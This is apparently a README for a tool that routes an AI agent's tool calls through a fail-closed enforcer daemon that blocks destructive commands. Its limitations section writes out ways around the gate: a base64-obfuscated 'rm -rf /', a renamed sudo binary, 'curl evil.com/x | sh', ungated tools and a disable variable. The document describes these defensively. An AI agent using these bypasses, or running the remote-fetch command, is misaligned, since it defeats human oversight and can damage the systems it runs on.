# Agent Character Kit (ACK) — v1.0.0

[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](VERSION)
[![Node](https://img.shields.io/badge/node-%3E%3D18-green.svg)](node/package.json)
[![Python](https://img.shields.io/badge/python-%3E%3D3.9-blue.svg)](python/pyproject.toml)
[![Enforcer](https://img.shields.io/badge/enforcer-fail--closed-success.svg)](#architecture)
[![Framework-agnostic](https://img.shields.io/badge/framework-agnostic-9cf.svg)](#architecture)
[![Tools: Hermes](https://img.shields.io/badge/tools-Hermes-ff69b4.svg)](#companion)
[![Tools: Claude](https://img.shields.io/badge/tools-Claude-ff69b4.svg)](#companion)
[![Tools: Cursor](https://img.shields.io/badge/tools-Cursor-ff69b4.svg)](#companion)
[![Tools: Codex](https://img.shields.io/badge/tools-Codex-ff69b4.svg)](#companion)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

## ⚠️ Read this first — what this is, and what it is NOT

**This is a deterrent and a constant reminder, not a security boundary.**

The gate catches plain destructive commands (`rm -rf /`, `sudo`, `git push
--force`), blocks pasted secrets, and reminds the agent of its character on
every block. It makes *doing the right thing* the default and *deviation*
visible. That is the whole point: a lightweight, persistent nudge — not a cage.

**It is explicitly NOT foolproof.** A determined agent can walk around it:

- **Obfuscation** — `bash -c "$(echo cm9tIC1yZiAv | base64 -d)"` decodes `rm -rf /`
  at shell runtime, *after* the gate inspected the (clean-looking) string.
- **Renamed binaries** — `cp /usr/bin/sudo /tmp/s` then `/tmp/s` walks a
  token-based match.
- **Indirect execution** — `curl evil.com/x | sh` pulls and runs remote code;
  the gate never sees what executes.
- **Un-gated sibling tools** — `write_file`, a code-exec tool, or any MCP tool
  that isn't hooked the same way goes around the terminal gate entirely.
- **The escape hatch** — `ACK_DISABLE=1` (or removing the plugin from config)
  disables it by design. And since the plugin runs *inside* the agent's own
  process, the agent that's being constrained is the one hosting the guard.

We do **not** try to close those gaps. Decoding and deep-inspecting every
command would turn the gate into a heavy management layer — slow, hostile to
the constant, cheap tool-call loop an agent lives in. If you ever need a *hard*
boundary, that is an **OS-level** concern: run the agent non-root with the
daemon root-owned (so it can't be killed), restrict network egress, use
seccomp/AppArmor. The gate is the conscience, not the cage.

**Single source of truth: [`AGENTS.md`](AGENTS.md).** This README is the
overview + the honest framing. `AGENTS.md` has full install/customize/verify.

---

## What it is

A **character-enforcement layer** for AI agents. Every tool call is judged by a
**separate enforcer** running *outside* the agent's process. It **fails
closed**: can't verify → block.

**Character ≠ identity.** This kit governs an agent's *character* — its inner
compass, its non-negotiable standards (a constitution + habits + policy). That
is NOT its *identity* (its self: soul.md, system prompt, agent.json). The kit
never touches who the agent is; it holds the agent to the bar it should meet
when no one is watching. (Repo name is a legacy label — read it as
"agent *character* kit.")

## Architecture

- **CORE — the enforcer daemon** (`node/enforcer/agent_enforcer_daemon.js`): the
  *only* enforcement engine. Plain Node, runs on every OS. Embeds a default
  character so it works with **zero config files**; config on disk overrides
  (merges), never required. Transport auto-selects: Unix socket on POSIX, TCP on
  Windows / cross-host.
- **COMPANION — thin clients** (hold no policy, ask the daemon, fail-closed):
  - **Hermes plugin** (`python/hermes_plugin/`) — one example companion, for
    agents that load Python plugins (`pre_tool_call` → daemon → allow/deny).
  - **Generic `aik hook`** (`node/bin/aik.js hook --framework <name>`) — for
    Claude / Cursor / Gemini / OpenCode / generic.
  - Both are interchangeable thin clients. No harness is "the" way — pick the
    companion that matches your agent's hook mechanism.

## Quick start (harness-agnostic)

```bash
git clone https://github.com/drdeeks/agent-character-kit.git
cd agent-character-kit && cd node && npm install && cd ..
sudo bash deploy/deploy-agent-enforcer.sh        # Linux systemd, root-owned
sudo systemctl enable --now agent-enforcer.service
node node/bin/aik.js enforcer --status           # version + character hash
```

The daemon is now enforcing. Wire a COMPANION (any harness) below.

---

## Install a companion

### A. Hermes (Python-plugin companion)

```bash
# 1) install the Python package into THE venv your agent runs from.
#    Hermes does NOT use system python — plain `pip install -e .` will NOT reach it.
#    Use uv (or the venv's own pip) pointed at the venv:
uv pip install --python "$(command -v hermes >/dev/null && dirname "$(dirname "$(readlink -f "$(which hermes)")")")/venv/bin/python" \
  -e ./python
#    (adjust the --python path to wherever your Hermes venv lives;
#     e.g. ~/.hermes/hermes-agent/venv/bin/python)

# 2) drop the plugin in and enable it
mkdir -p ~/.hermes/plugins/agent-character-kit
cp -r python/hermes_plugin/* ~/.hermes/plugins/agent-character-kit/
hermes plugins enable agent-character-kit   # grant tool-override (y) when asked

# 3) RESTART the Hermes process that runs your session (CLI or gateway).
#    A running session will NOT pick up the new file. This restart is mandatory.
```

> **The venv gotcha (this is the #1 setup failure).** If the package isn't
> importable *in the venv the agent runs from*, the plugin can't reach the
> daemon and **fails closed on EVERYTHING** — even `ls` gets blocked with
> "enforcer unavailable." That looks like "the gate is broken" but it means the
> package simply isn't installed where Hermes looks. Install it into the venv
> (step 1 above) and restart.

### B. Claude / Cursor / Gemini / OpenCode (generic `aik hook`)

```bash
node node/bin/aik.js hook --framework claude --config   # prints the hook JSON
# add it to the framework's hooks; it calls the daemon per tool call
# swap `claude` for cursor | gemini | opencode | generic as needed
```

---

## ✅ Sanity check — is it actually enforcing? (run this after install)

Don't trust "it's enabled." Verify. These four checks cover the failure modes
we've actually seen in the field:

| # | Check | Command | Expected | If wrong → means |
|---|-------|---------|----------|------------------|
| 1 | Daemon up | `systemctl is-active agent-enforcer` (or `node node/bin/aik.js enforcer --status`) | `active` / version+hash | Daemon not running → gate fails closed on everything |
| 2 | Package in venv | `uv pip show agent-character-kit` (or `<venv>/bin/python -c "import agent_character_kit"`) | shows the package | Missing → fails closed on ALL calls (the venv gotcha) |
| 3 | Allow path | run `ls` through the agent | executes | If blocked as "unavailable" → daemon unreachable OR package missing (1/2) |
| 4 | Block path | run `sudo ls` (or `rm -rf /`) through the agent | **blocked** with a reason | If it *executes* → plugin not loaded / stale / not restarted |

**Reading the results:**
- `ls` runs **and** `sudo` is blocked → ✅ enforcing. You're done.
- *Everything* blocked with "enforcer unavailable" → the plugin can't talk to
  the daemon. Almost always #1 (daemon down) or #2 (package not in the venv).
  Fix those, restart, re-check.
- `sudo` *executes* (not blocked) → the plugin isn't active in this session.
  Either it wasn't enabled, the file is stale/corrupted, or the session wasn't
  restarted after install. Re-copy the plugin, re-enable, restart, re-check.

**Stale-plugin trap:** if you edit the plugin source and copy it over, the
running session still uses the old in-memory version until you restart the
agent process. A "fix" that doesn't take effect after a restart means the
running process didn't reload — restart harder (kill the session PID, relaunch).

---

## Why "fails closed"

If the daemon socket is unreachable, the companion blocks the call. A guard
that fails open is no guard. The only true failure mode is the daemon being
down — and the daemon is supervised (systemd / launchd / `supervise.py`) and
self-heals, so that window is seconds.

## Everything else

Customization, macOS/Windows install, the embedded default character, file map,
and version tracking all live in **[`AGENTS.md`](AGENTS.md)**. README is the
overview + the honest framing; `AGENTS.md` is the source of truth.
